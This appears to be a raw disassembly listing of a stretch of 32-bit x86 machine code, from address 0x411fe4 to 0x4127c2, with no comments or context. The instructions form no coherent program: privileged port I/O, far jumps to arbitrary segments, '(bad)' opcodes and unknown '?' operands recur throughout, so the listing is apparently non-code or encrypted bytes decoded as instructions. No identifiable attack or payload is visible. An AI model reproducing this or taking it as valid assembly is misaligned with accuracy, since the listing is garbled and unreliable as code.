  411fe4:	adc    al,BYTE PTR [ebx+edi*2+0x78]
  411fe8:	mov    ds:0x2b5527cc,eax
  411fed:	xor    BYTE PTR [edx+0x6f],bl
  411ff0:	jnp    0x411fc2
  411ff2:	je     0x41200e
  411ff4:	mov    cl,0x32
  411ff6:	push   es
  411ff7:	scas   eax,DWORD PTR es:[edi]
  411ff8:	test   ebx,ebx
  411ffa:	aam    0xda
  411ffc:	imul   eax,DWORD PTR [esi],0xa860cccb
  412002:	push   esp
  412003:	fadd   DWORD PTR [edi+0x2a]
  412006:	and    eax,0x62f0c12f
  41200b:	push   ecx
  41200c:	add    eax,0x7f6ab3a5
  412011:	adc    eax,0x66bc4f9c
  412016:	add    ah,dh
  412018:	push   eax
  412019:	jecxz  0x41208a
  41201b:	xor    eax,0xf58f49e9
  412020:	and    ebp,eax
  412022:	inc    edi
  412023:	mov    eax,0xbdd5f232
  412028:	sahf   
  412029:	mov    BYTE PTR [ebx-0x364b096c],0xc0
  412030:	adc    DWORD PTR [edx],edi
  412032:	daa    
  412033:	sub    al,0xfd
  412035:	pop    ecx
  412036:	pusha  
  412037:	nop
  412038:	xchg   esp,eax
  412039:	jmp    0x844e:0xab249a15
  412040:	cmp    dh,BYTE PTR [ecx+0x71]
  412043:	mov    esp,0xb97ee29b
  412048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412049:	and    al,0x9b
  41204b:	mov    ebx,0x1e04469b
  412050:	sub    dh,bl
  412052:	scas   eax,DWORD PTR es:[edi]
  412053:	pop    ecx
  412054:	xchg   ebx,eax
  412055:	repnz push ecx
  412057:	cmp    al,0x9d
  412059:	mov    eax,0x28f36d3d
  41205e:	mov    dh,0xe6
  412060:	rol    BYTE PTR [esi+0x7c],0x78
  412064:	sbb    dl,BYTE PTR [esi+0x68b6b6a7]
  41206a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41206b:	fnsave [ebp-0x57]
  41206e:	xchg   esp,eax
  41206f:	jne    0x412019
  412071:	fcmovbe st,st(7)
  412073:	mov    esi,0xa3b4f772
  412078:	div    BYTE PTR [edi+0x22]
  41207b:	pusha  
  41207c:	fimul  DWORD PTR [eax-0x5b862c0d]
  412082:	inc    eax
  412083:	lock xchg esp,eax
  412085:	jmp    0x7988:0xe2c037ec
  41208c:	leave  
  41208d:	sbb    bh,ch
  41208f:	lahf   
  412090:	pop    edi
  412091:	cwde   
  412092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412093:	adc    ah,0x4d
  412096:	retf   0x2c36
  412099:	mov    WORD PTR [esi],gs
  41209b:	jbe    0x412051
  41209d:	cmp    BYTE PTR [ecx+0x65],cl
  4120a0:	out    0x1c,eax
  4120a2:	mov    ecx,DWORD PTR [edx+0x49862282]
  4120a8:	in     al,0xaf
  4120aa:	mov    ah,0x38
  4120ac:	outs   dx,DWORD PTR ds:[esi]
  4120ad:	sti    
  4120ae:	xor    eax,0x489d8888
  4120b3:	ins    BYTE PTR es:[edi],dx
  4120b4:	pushf  
  4120b5:	repz jmp 0x8f47b446
  4120bb:	mov    esp,edx
  4120bd:	ja     0x412113
  4120bf:	popf   
  4120c0:	inc    edx
  4120c1:	test   eax,0x1d72f6d8
  4120c6:	mov    DWORD PTR [edi],ebp
  4120c8:	xlat   BYTE PTR ds:[ebx]
  4120c9:	xor    BYTE PTR [esp+edx*4+0x44f4f9ce],dl
  4120d0:	pop    ss
  4120d1:	aad    0x31
  4120d3:	pop    edx
  4120d4:	or     al,0x46
  4120d6:	shl    bl,cl
  4120d8:	cmp    al,0x37
  4120da:	pop    eax
  4120db:	jle    0x4120b4
  4120dd:	gs jge 0x412105
  4120e0:	dec    ebx
  4120e1:	dec    esi
  4120e2:	sbb    al,0x13
  4120e4:	xchg   edi,eax
  4120e5:	inc    edx
  4120e6:	mov    cl,0x77
  4120e8:	outs   dx,BYTE PTR ds:[esi]
  4120e9:	ret    0xa909
  4120ec:	sahf   
  4120ed:	and    BYTE PTR [ebx-0x170fd4a5],ch
  4120f3:	push   ds
  4120f4:	mov    ds,WORD PTR cs:[ecx+0x7bb20644]
  4120fb:	jmp    0x412129
  4120fd:	cmp    edi,DWORD PTR ds:0x7b1f3b18
  412103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412105:	mov    edx,edi
  412107:	dec    edi
  412108:	loop   0x41212e
  41210a:	mov    al,0x64
  41210c:	inc    esp
  41210d:	jg     0x4120bd
  41210f:	inc    esi
  412110:	mov    ebp,0x6d271b41
  412115:	or     BYTE PTR [edi],0x18
  412118:	fwait
  412119:	ins    BYTE PTR es:[edi],dx
  41211a:	inc    edi
  41211b:	inc    esp
  41211c:	push   ss
  41211d:	sub    ch,BYTE PTR [ebp+0x1]
  412120:	mov    dl,0xc2
  412122:	cmp    ecx,esp
  412124:	fisubr DWORD PTR [esi]
  412126:	dec    esi
  412127:	lea    ecx,[edx+0x2ae6d4c4]
  41212d:	jae    0x4120e4
  41212f:	mov    bl,0x9c
  412131:	dec    ecx
  412132:	and    eax,0x2fe4281
  412137:	mov    esp,0xc217c43b
  41213c:	es ret 0x5dc9
  412140:	nop
  412141:	retf   
  412142:	in     al,0xf8
  412144:	dec    edx
  412145:	jp     0x412167
  412147:	xor    DWORD PTR [esi],edx
  412149:	dec    edi
  41214a:	test   eax,0x72f0cd82
  41214f:	test   al,0xba
  412151:	jb     0x412160
  412153:	retf   
  412154:	cli    
  412155:	sub    al,0xf8
  412157:	test   eax,0xc61feeb1
  41215c:	loope  0x4120e4
  41215e:	mov    ebp,0xb94e9d54
  412163:	xor    eax,0x2362c851
  412168:	cmp    esi,esi
  41216a:	sbb    bh,BYTE PTR [eax]
  41216c:	cmp    al,0xa9
  41216e:	sahf   
  41216f:	mov    cl,0xba
  412171:	mov    ebp,?
  412173:	jge    0x412130
  412175:	lds    esi,FWORD PTR [ebx-0x63]
  412178:	cmc    
  412179:	mov    WORD PTR [eax+0x76dc5c47],?
  41217f:	stos   DWORD PTR es:[edi],eax
  412180:	lea    eax,[edi+0x77]
  412183:	lods   eax,DWORD PTR ds:[esi]
  412184:	pop    ecx
  412185:	push   0xffffff9f
  412187:	popf   
  412188:	push   0xf3ae2327
  41218d:	imul   ebp,ebp,0xbf4f43ec
  412193:	out    0xbb,al
  412195:	fnstenv [esp+esi*8+0x67]
  412199:	push   ds
  41219a:	cs ss inc ebp
  41219d:	repnz pop es
  41219f:	popf   
  4121a0:	push   ss
  4121a1:	dec    BYTE PTR [di-0x25]
  4121a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a6:	jmp    0xc7b8abb9
  4121ab:	(bad)  
  4121ac:	stc    
  4121ad:	or     DWORD PTR [edx+0x24b4a65a],edx
  4121b3:	mov    DWORD PTR [edi-0x4a],0xf732d041
  4121ba:	std    
  4121bb:	or     eax,0xc0f3d617
  4121c0:	addr16 push esi
  4121c2:	xchg   ecx,eax
  4121c3:	xor    al,0xe8
  4121c5:	js     0x412177
  4121c7:	shr    ebx,1
  4121c9:	das    
  4121ca:	pop    ss
  4121cb:	or     al,0xe1
  4121cd:	sar    edx,cl
  4121cf:	dec    esi
  4121d0:	pop    es
  4121d1:	jg     0x412173
  4121d3:	scas   al,BYTE PTR es:[edi]
  4121d4:	aas    
  4121d5:	je     0x4121ee
  4121d7:	rcl    BYTE PTR [edx+edi*8+0x5b6a2d90],0xad
  4121df:	fsubr  DWORD PTR [ecx]
  4121e1:	(bad)  
  4121e2:	sub    BYTE PTR [ecx],ch
  4121e4:	cmp    al,ah
  4121e6:	iret   
  4121e7:	ins    BYTE PTR es:[edi],dx
  4121e8:	or     ebp,DWORD PTR [edx+0x68]
  4121eb:	adc    al,0x3c
  4121ed:	fwait
  4121ee:	sti    
  4121ef:	cdq    
  4121f0:	xor    BYTE PTR [ecx-0x167ac876],0x30
  4121f7:	xlat   BYTE PTR ds:[ebx]
  4121f8:	dec    edx
  4121f9:	mov    ecx,0xeb050af
  4121fe:	fs mov ecx,0x524dd824
  412204:	adc    edx,DWORD PTR [ebx-0x7a]
  412207:	add    eax,DWORD PTR [ecx+0x23cba45a]
  41220d:	scas   eax,DWORD PTR es:[edi]
  41220e:	sbb    BYTE PTR ds:0x1c1b2719,dl
  412214:	fptan  
  412216:	mov    bh,0xdd
  412218:	jmp    0x412273
  41221a:	int    0x62
  41221c:	ins    BYTE PTR es:[edi],dx
  41221d:	imul   esp,DWORD PTR [ebp-0x5c9cd060],0xa2fff6fe
  412227:	sub    DWORD PTR [esi-0x1],ecx
  41222a:	in     eax,0x4c
  41222c:	sub    eax,eax
  41222e:	inc    esi
  41222f:	add    eax,0x1e5fb627
  412234:	ins    BYTE PTR es:[edi],dx
  412235:	xchg   edi,eax
  412236:	adc    esp,DWORD PTR [ebp+ecx*1+0x5c10dc39]
  41223d:	adc    al,0x15
  41223f:	call   FWORD PTR ds:0x9089cf32
  412245:	or     BYTE PTR [ebp-0x19f53e79],0x28
  41224c:	sar    BYTE PTR [ebp-0x40b250e9],1
  412252:	outs   dx,BYTE PTR ds:[esi]
  412253:	jne    0x4122a4
  412255:	dec    ebp
  412256:	sbb    ch,0x90
  412259:	add    DWORD PTR [ebx-0x6b6b3ae7],edi
  41225f:	jb     0x4121fb
  412261:	sbb    al,0x41
  412263:	mov    cl,0xa3
  412265:	jl     0x412265
  412267:	mov    edx,0xd74a9360
  41226c:	and    dl,al
  41226e:	sub    BYTE PTR [ebx+eax*2],cl
  412271:	test   DWORD PTR ds:0xb40a3d7a,0xa2ca94de
  41227b:	push   edx
  41227c:	sbb    al,0x83
  41227e:	adc    ebx,edx
  412280:	pushf  
  412281:	fimul  WORD PTR [edi]
  412283:	push   edi
  412284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412285:	out    dx,al
  412286:	mov    ebx,0xb605c387
  41228b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41228c:	lods   eax,DWORD PTR ds:[esi]
  41228d:	(bad)  
  41228e:	pmaxsw mm7,QWORD PTR [esi-0x35]
  412292:	jno    0x412302
  412294:	clc    
  412295:	ins    DWORD PTR es:[edi],dx
  412296:	scas   al,BYTE PTR es:[edi]
  412297:	fldcw  WORD PTR [edx+0x39]
  41229a:	inc    ecx
  41229b:	xor    esp,DWORD PTR [ebx]
  41229d:	popf   
  41229e:	inc    ebx
  41229f:	lea    eax,[eax+0x4d]
  4122a2:	xchg   edx,eax
  4122a3:	test   DWORD PTR [edx],0x694c43f2
  4122a9:	outs   dx,DWORD PTR ds:[esi]
  4122aa:	lahf   
  4122ab:	(bad)  
  4122ac:	mov    ebp,0xf46dc73f
  4122b1:	sbb    ecx,DWORD PTR [ebx+0x4d]
  4122b4:	adc    eax,0x8fc725f5
  4122b9:	mov    edi,0xae4f7824
  4122be:	mov    dl,0x59
  4122c0:	cmp    DWORD PTR fs:[eax-0x4b],edx
  4122c4:	xchg   edi,eax
  4122c5:	pop    ss
  4122c6:	sub    DWORD PTR [ebx-0x79],eax
  4122c9:	ja     0x41232f
  4122cb:	jns    0x412255
  4122cd:	xor    BYTE PTR [ebx],cl
  4122cf:	jecxz  0x4122e4
  4122d1:	lea    edx,[eax-0x41]
  4122d4:	or     eax,0x65f47e0c
  4122d9:	popa   
  4122da:	jmp    0x1505:0x3844babe
  4122e1:	repnz test eax,0xd834e299
  4122e7:	adc    BYTE PTR [edx+0x59],ah
  4122ea:	jge    0x4122f4
  4122ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ed:	and    ah,BYTE PTR [ebx+0x30f4b5dc]
  4122f3:	jbe    0x412310
  4122f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f6:	mov    WORD PTR [esi+edi*2+0xd],?
  4122fa:	xchg   ebp,eax
  4122fb:	and    ebx,eax
  4122fd:	push   ss
  4122fe:	cmp    ebx,esi
  412300:	sar    DWORD PTR [eax-0xaa67b74],0x47
  412307:	sub    BYTE PTR [ebp+0x348b1dee],cl
  41230d:	arpl   WORD PTR [ecx+esi*8+0x316690a7],bx
  412314:	dec    edx
  412315:	mov    esi,0xb7cbb153
  41231a:	adc    BYTE PTR [ebx],ch
  41231c:	out    0x8c,al
  41231e:	sub    ch,BYTE PTR [esi+0x1cb52bb5]
  412324:	or     eax,0x15ddfaab
  412329:	mov    ds:0xa9dff102,al
  41232e:	call   0xbf094fc6
  412333:	call   0x6191ca4b
  412338:	mov    BYTE PTR [edi+eax*1-0x5f],cl
  41233c:	or     eax,0x64e8c54e
  412341:	cdq    
  412342:	jl     0x412316
  412344:	sbb    bl,ch
  412346:	into   
  412347:	and    BYTE PTR [edx],dh
  412349:	xchg   ecx,eax
  41234a:	cld    
  41234b:	sub    al,0xc2
  41234d:	add    al,0xce
  41234f:	scas   eax,DWORD PTR es:[edi]
  412350:	dec    esi
  412351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412352:	rcl    BYTE PTR [edi+esi*8],cl
  412355:	scas   al,BYTE PTR es:[edi]
  412356:	imul   ecx,ebx,0x5
  412359:	fmul   QWORD PTR [ebx+0x7961f080]
  41235f:	cmp    ecx,ecx
  412361:	dec    BYTE PTR [edx+0xc1dc420]
  412367:	push   0xffffffd8
  412369:	xchg   edx,eax
  41236a:	div    DWORD PTR [edx-0x3f]
  41236d:	pusha  
  41236e:	test   BYTE PTR [edi-0x47b7e362],cl
  412374:	jecxz  0x41239e
  412376:	scas   eax,DWORD PTR es:[edi]
  412377:	data16 jno 0x4123de
  41237a:	cli    
  41237b:	mov    bh,0x70
  41237d:	xchg   esi,eax
  41237e:	push   ebx
  41237f:	fucomi st,st(1)
  412381:	sbb    esp,esi
  412383:	mov    cl,0x50
  412385:	aam    0xad
  412387:	lea    edx,[eax+0x3e]
  41238a:	jmp    0xca64d1ca
  41238f:	inc    ebp
  412390:	adc    bh,0x8b
  412393:	mov    edx,0xd5582e7c
  412398:	out    dx,eax
  412399:	js     0x41235e
  41239b:	mov    bl,BYTE PTR [edi]
  41239d:	cmp    al,0xdc
  41239f:	dec    edx
  4123a0:	adc    al,0xd1
  4123a2:	fidivr DWORD PTR [esi-0x5243aa77]
  4123a8:	jno    0x4123e7
  4123aa:	jne    0x41232c
  4123ac:	rcl    ebp,cl
  4123ae:	mov    eax,fs:0x38d26992
  4123b4:	test   al,0xdd
  4123b6:	mov    eax,ds:0xd69112d4
  4123bb:	add    eax,0xb9a37db
  4123c0:	mov    ecx,?
  4123c2:	or     BYTE PTR [edx],ch
  4123c4:	cmp    al,0x57
  4123c6:	pop    ds
  4123c7:	adc    ah,BYTE PTR [esi-0x64]
  4123ca:	icebp  
  4123cb:	sbb    al,0x92
  4123cd:	xchg   ebp,eax
  4123ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123cf:	and    ebp,eax
  4123d1:	loop   0x412423
  4123d3:	es pop ecx
  4123d5:	dec    eax
  4123d6:	xchg   edi,eax
  4123d7:	lea    edi,[edx-0x33]
  4123da:	xchg   edx,eax
  4123db:	jbe    0x4123d7
  4123dd:	sbb    esi,esi
  4123df:	imul   edi,DWORD PTR [eax+ecx*8],0x6deda790
  4123e6:	rep stos DWORD PTR es:[edi],eax
  4123e8:	lods   al,BYTE PTR ds:[esi]
  4123e9:	stos   BYTE PTR es:[edi],al
  4123ea:	pop    es
  4123eb:	sahf   
  4123ec:	pop    esp
  4123ed:	outs   dx,DWORD PTR ds:[esi]
  4123ee:	or     al,BYTE PTR [ebp-0x2d]
  4123f1:	repnz xor DWORD PTR ds:0x2c95802c,edi
  4123f8:	hlt    
  4123f9:	inc    eax
  4123fa:	sub    ah,dh
  4123fc:	daa    
  4123fd:	or     al,0xcd
  4123ff:	push   ecx
  412400:	stos   BYTE PTR es:[edi],al
  412401:	shl    DWORD PTR [ebx-0x45],0xee
  412405:	sub    DWORD PTR ds:0x3effe1b2,edx
  41240b:	lahf   
  41240c:	fnstenv [ecx-0x20]
  41240f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412410:	sbb    eax,0xc938c937
  412415:	and    al,0x4
  412417:	inc    esi
  412418:	mov    bh,bl
  41241a:	and    BYTE PTR [ebx-0x4d],0xae
  41241e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41241f:	lods   eax,DWORD PTR ds:[esi]
  412420:	sbb    DWORD PTR [esi*2+0x6f683c96],edi
  412427:	in     al,0x65
  412429:	and    al,0x8d
  41242b:	mov    ds:0xa9542622,al
  412430:	mov    ebp,0xac4f77a0
  412435:	mov    ds,WORD PTR [edi]
  412437:	je     0x412439
  412439:	or     BYTE PTR [edx+0x11126fce],al
  41243f:	mov    edx,0x9fe9afe8
  412444:	add    al,0xdc
  412446:	cli    
  412447:	or     al,0xc2
  412449:	and    edx,esp
  41244b:	sti    
  41244c:	scas   al,BYTE PTR es:[edi]
  41244d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41244e:	and    al,0xbb
  412450:	iret   
  412451:	or     al,0x2b
  412453:	jo     0x4124a6
  412455:	xchg   DWORD PTR [edi-0x25],eax
  412458:	or     cl,BYTE PTR [eax]
  41245a:	fs sar ebx,0x7e
  41245e:	push   ecx
  41245f:	adc    edi,ebx
  412461:	sbb    bl,BYTE PTR [edx-0x66]
  412464:	xlat   BYTE PTR ds:[ebx]
  412465:	adc    ebp,0xb5f3d99a
  41246b:	jno    0x41241d
  41246d:	xor    dl,BYTE PTR [edi+edi*1+0x72]
  412471:	ins    BYTE PTR es:[edi],dx
  412472:	sbb    ecx,ecx
  412474:	fsubp  st(3),st
  412476:	outs   dx,DWORD PTR ds:[esi]
  412477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412478:	or     eax,0x67c4962a
  41247d:	jne    0x4124d7
  41247f:	push   0x679aeb8b
  412484:	loope  0x412472
  412486:	aad    0x93
  412488:	mov    BYTE PTR [edi-0x7a87714f],dh
  41248e:	shl    BYTE PTR [ebp-0x4d1189dd],0x26
  412495:	sub    ecx,DWORD PTR [ebx+esi*8-0x3b]
  412499:	test   eax,0x6101a25d
  41249e:	sti    
  41249f:	lea    ebp,[edi-0x5c7b0bff]
  4124a5:	cwde   
  4124a6:	pop    ds
  4124a7:	test   eax,0xac505598
  4124ac:	out    0xa5,al
  4124ae:	jae    0x412502
  4124b0:	enter  0x88f2,0x1a
  4124b4:	mov    ebp,0x429d0584
  4124b9:	sub    DWORD PTR [edx-0xa27e170],edi
  4124bf:	aaa    
  4124c0:	add    edi,DWORD PTR ds:0xecace5e1
  4124c6:	xchg   ebp,eax
  4124c7:	cs ins BYTE PTR es:[edi],dx
  4124c9:	mov    dh,0x61
  4124cb:	push   esi
  4124cc:	inc    ebx
  4124cd:	fcomp  QWORD PTR [eax+0xdd1a971]
  4124d3:	icebp  
  4124d4:	mov    esi,0x2fca242f
  4124d9:	or     eax,0x864cc875
  4124de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124df:	jge    0x41248c
  4124e1:	and    al,0xac
  4124e3:	mov    edi,0x25b02f27
  4124e8:	adc    ecx,DWORD PTR [esp+esi*8+0x44]
  4124ec:	push   ebx
  4124ed:	lods   eax,DWORD PTR ds:[esi]
  4124ee:	(bad)  
  4124ef:	push   eax
  4124f0:	cmp    edi,edx
  4124f2:	mov    eax,ds:0x23b25ea8
  4124f7:	xchg   ebp,eax
  4124f8:	push   0x891c66e8
  4124fd:	mov    edx,0x992340b8
  412502:	dec    eax
  412503:	jg     0x412540
  412505:	fcmovb st,st(1)
  412507:	add    eax,0xf5b4c177
  41250c:	push   edx
  41250d:	dec    edi
  41250e:	repnz fstp TBYTE PTR [edx+0xe]
  412512:	iret   
  412513:	out    0x8e,al
  412515:	repz (bad) [esi-0x2c]
  412519:	add    BYTE PTR [edx+0x75],dl
  41251c:	and    BYTE PTR [ebx],bh
  41251e:	repz cmp cl,BYTE PTR [ecx]
  412521:	stc    
  412522:	lock ins DWORD PTR es:[edi],dx
  412524:	sub    dh,BYTE PTR [esp+ecx*2-0x337e6596]
  41252b:	fs nop
  41252d:	push   ecx
  41252e:	xor    dl,BYTE PTR [eax+0x2e43adef]
  412534:	(bad)  
  412535:	cmc    
  412536:	loop   0x4124f3
  412538:	scas   al,BYTE PTR es:[edi]
  412539:	lds    eax,FWORD PTR [ebp+0x5f0221b9]
  41253f:	mov    ds:0xe05bf6ae,eax
  412544:	out    0xb1,eax
  412546:	scas   al,BYTE PTR es:[edi]
  412547:	or     ebp,DWORD PTR [ebx+ebx*4-0x47d38364]
  41254e:	xor    DWORD PTR [ecx-0x31],esp
  412551:	xchg   ebp,eax
  412552:	out    dx,al
  412553:	dec    edi
  412554:	adc    BYTE PTR [edx-0x75],0x8f
  412558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412559:	das    
  41255a:	xor    dl,BYTE PTR [esp+eax*1]
  41255d:	adc    al,BYTE PTR [edi]
  41255f:	bnd js 0x4125a2
  412562:	mov    dh,0xfb
  412564:	popf   
  412565:	ret    
  412566:	fwait
  412567:	shr    BYTE PTR [edx-0x74f9ce1a],0xd2
  41256e:	xchg   esi,eax
  41256f:	lea    edx,cs:[eax+0x7e]
  412573:	fdiv   DWORD PTR [ecx-0x4108c6d5]
  412579:	pop    ecx
  41257a:	out    0xab,eax
  41257c:	aas    
  41257d:	jne    0x4125d0
  41257f:	pop    ds
  412580:	jl     0x4125ef
  412582:	push   ebp
  412583:	xlat   BYTE PTR ds:[ebx]
  412584:	mov    bl,0x51
  412586:	dec    ebx
  412587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412589:	ret    0x951b
  41258c:	sbb    eax,0xb23bf998
  412591:	stc    
  412592:	xchg   ebp,eax
  412593:	jae    0x412529
  412595:	mov    esp,ebx
  412597:	jg     0x4125b3
  412599:	inc    esp
  41259a:	mov    bh,0x52
  41259c:	sub    al,0x35
  41259e:	lds    eax,FWORD PTR [edx+0x373ab5a4]
  4125a4:	in     eax,0xd2
  4125a6:	jmp    0xf94ec31d
  4125ab:	mov    BYTE PTR fs:[eax*8+0x603527fd],ah
  4125b3:	test   BYTE PTR [esi],bh
  4125b5:	mov    ebx,DWORD PTR [edx-0x6f]
  4125b8:	pop    ebx
  4125b9:	das    
  4125ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125bb:	cld    
  4125bc:	and    eax,0xfcf38015
  4125c1:	add    BYTE PTR [edi+0x3df0950b],ah
  4125c7:	ret    0xfe3
  4125ca:	test   al,0x11
  4125cc:	dec    eax
  4125cd:	mov    edx,DWORD PTR [ebx]
  4125cf:	mov    edx,0xa2809419
  4125d4:	(bad)  
  4125d5:	js     0x412564
  4125d7:	es pop ebx
  4125d9:	jb     0x4125e9
  4125db:	xchg   ecx,eax
  4125dc:	ret    0x9418
  4125df:	ss jmp 0x41256d
  4125e2:	out    0x4,eax
  4125e4:	inc    ecx
  4125e5:	mov    esp,0xe8f625cb
  4125ea:	jmp    0x9e769cbf
  4125ef:	lahf   
  4125f0:	cld    
  4125f1:	pushf  
  4125f2:	ret    0xb875
  4125f5:	xor    ebx,DWORD PTR [ecx-0x33]
  4125f8:	clc    
  4125f9:	cld    
  4125fa:	repz sub eax,0x803beae3
  412600:	es fdiv st,st(3)
  412603:	mov    esi,0x46c1571a
  412608:	sub    al,0xb6
  41260a:	xor    al,ah
  41260c:	jecxz  0x41265c
  41260e:	inc    ebx
  41260f:	mov    edi,0x9f731035
  412614:	pop    edi
  412615:	push   0x76
  412617:	lods   eax,DWORD PTR ds:[esi]
  412618:	dec    esi
  412619:	push   ecx
  41261a:	fstp   st(6)
  41261c:	xchg   edx,eax
  41261d:	sub    al,0x19
  41261f:	pop    edi
  412620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412621:	mov    edi,0x5ce83622
  412626:	fnstcw WORD PTR [esp+0x5]
  41262a:	adc    BYTE PTR [ebp-0x61d8ef6d],al
  412630:	dec    eax
  412631:	mov    eax,ds:0x1d31dbf0
  412636:	xchg   edx,eax
  412637:	mov    bl,0x95
  412639:	dec    edx
  41263a:	imul   esi,ebp,0xa
  41263d:	loope  0x41261e
  41263f:	retf   0xbdbd
  412642:	mov    dh,0xa8
  412644:	cmp    BYTE PTR [esi-0x21],dh
  412647:	inc    ecx
  412648:	jl     0x412629
  41264a:	sti    
  41264b:	pop    eax
  41264c:	les    edx,FWORD PTR [edx-0x2123cddd]
  412652:	and    DWORD PTR [ebx-0x3c80df51],ecx
  412658:	sti    
  412659:	fdivr  DWORD PTR [ecx+0x7c]
  41265c:	hlt    
  41265d:	out    dx,eax
  41265e:	ins    DWORD PTR es:[edi],dx
  41265f:	retf   0x1937
  412662:	fcmove st,st(6)
  412664:	inc    ecx
  412665:	sub    eax,0x110ae96b
  41266a:	iret   
  41266b:	enter  0x5e87,0x7a
  41266f:	mov    eax,0xd7ce1d1c
  412674:	sbb    al,BYTE PTR [edx-0x4f]
  412677:	mov    ebx,0x8d25cf86
  41267c:	das    
  41267d:	sbb    BYTE PTR [edi-0x5f],dl
  412680:	pop    ss
  412681:	xchg   edi,eax
  412682:	inc    ebx
  412683:	loope  0x4126f4
  412685:	inc    esp
  412686:	fldcw  WORD PTR [eax-0x6f]
  412689:	or     bh,ah
  41268b:	inc    esp
  41268c:	push   edx
  41268d:	(bad)  
  41268e:	cli    
  41268f:	push   ebp
  412690:	hlt    
  412691:	sbb    BYTE PTR [eax+0x66298b20],0x82
  412698:	nop
  412699:	push   ebp
  41269a:	das    
  41269b:	js     0x4126d3
  41269d:	adc    eax,0x4aa2b601
  4126a2:	stos   BYTE PTR es:[edi],al
  4126a3:	imul   esp,DWORD PTR [edi+0x75],0x1eacb63a
  4126aa:	fisubr WORD PTR [ebp-0x155b657]
  4126b0:	mov    edx,0xe138abd2
  4126b5:	fabs   
  4126b7:	add    eax,0x74660748
  4126bc:	xchg   edi,eax
  4126bd:	and    BYTE PTR [edi],ch
  4126bf:	in     al,dx
  4126c0:	retf   
  4126c1:	lock das 
  4126c3:	and    edx,edi
  4126c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126c6:	out    0x5f,eax
  4126c8:	sub    cl,BYTE PTR [edx+0x36a9a7a4]
  4126ce:	xchg   esp,eax
  4126cf:	pop    ebx
  4126d0:	lock xlat BYTE PTR ds:[ebx]
  4126d2:	lea    ebp,[eax-0x2b]
  4126d5:	mov    eax,ds:0x22a79921
  4126da:	loop   0x412698
  4126dc:	in     al,0x8e
  4126de:	dec    edx
  4126df:	fmul   st(3),st
  4126e1:	out    0x20,eax
  4126e3:	imul   ebp,DWORD PTR [ecx+edx*8+0x75f576ea],0x22be443e
  4126ee:	add    bl,BYTE PTR [edx]
  4126f0:	or     BYTE PTR [esi],cl
  4126f2:	sbb    eax,0x87b5e234
  4126f7:	inc    ecx
  4126f8:	sahf   
  4126f9:	dec    ebp
  4126fa:	not    DWORD PTR [ebx-0x35d22945]
  412700:	clc    
  412701:	dec    ecx
  412702:	sbb    DWORD PTR [eax],ebp
  412704:	add    DWORD PTR [ecx],0x7d
  412707:	popf   
  412708:	mov    cl,0x3
  41270a:	mov    ds:0x849dbe88,al
  41270f:	jle    0x4126ab
  412711:	dec    bp
  412713:	arpl   WORD PTR ss:[edx],si
  412716:	inc    ebx
  412717:	and    eax,0xac12bb91
  41271c:	sbb    BYTE PTR [esi-0x69fd728],dl
  412722:	xor    eax,0x2dc244ac
  412727:	xor    BYTE PTR [edx+0x72],al
  41272a:	lahf   
  41272b:	jae    0x41277d
  41272d:	test   dh,cl
  41272f:	xor    DWORD PTR [edx-0xa8142f6],edi
  412735:	xor    bl,BYTE PTR [edi-0x7647f17a]
  41273b:	mov    eax,0xb67a315c
  412740:	in     eax,dx
  412741:	fdivr  DWORD PTR [ecx]
  412743:	repz jp 0x412764
  412746:	mov    edi,0x9335d86
  41274b:	sbb    bl,BYTE PTR [edx]
  41274d:	cmc    
  41274e:	mov    dh,0xd4
  412750:	out    0xe4,al
  412752:	and    eax,edx
  412754:	jp     0x412787
  412756:	fdivr  QWORD PTR [esi+0x683d22f3]
  41275c:	jno    0x4127c9
  41275e:	lea    edx,[ebx+0xf7f138b]
  412764:	cmp    al,0xa9
  412766:	retf   0x1a52
  412769:	jl     0x412727
  41276b:	bound  ebx,QWORD PTR [ecx+0x5092bc1c]
  412771:	imul   ebp,DWORD PTR [ecx+0x79],0x995f4059
  412778:	pop    ecx
  412779:	mov    al,ds:0x12d7671e
  41277e:	out    dx,eax
  41277f:	fist   DWORD PTR [ebp-0x7572a3f0]
  412785:	pop    edi
  412786:	shl    DWORD PTR [ecx],cl
  412788:	sub    eax,0x8e711f7f
  41278d:	fnsave [ecx]
  41278f:	mov    ah,0x75
  412791:	cs in  al,dx
  412793:	cmp    BYTE PTR [eax],dl
  412795:	cmp    dh,BYTE PTR es:[edx]
  412798:	ja     0x41275a
  41279a:	jns    0x4127ef
  41279c:	ror    DWORD PTR [edi-0x6b],1
  41279f:	adc    edx,DWORD PTR fs:[esi]
  4127a2:	mov    al,0x7
  4127a4:	dec    BYTE PTR [edx-0x5b]
  4127a7:	fisubr DWORD PTR [edi]
  4127a9:	mov    eax,ds:0xa7d1fcc
  4127ae:	mov    esi,0xc22a7891
  4127b3:	cmp    DWORD PTR [ecx-0x6c],ebx
  4127b6:	mov    edi,ecx
  4127b8:	pop    ecx
  4127b9:	mov    DWORD PTR [edi+0x7b],eax
  4127bc:	adc    eax,0x4b97fba1
  4127c1:	pusha  
  4127c2:	and    BYTE PTR [esi-0x5c],dh
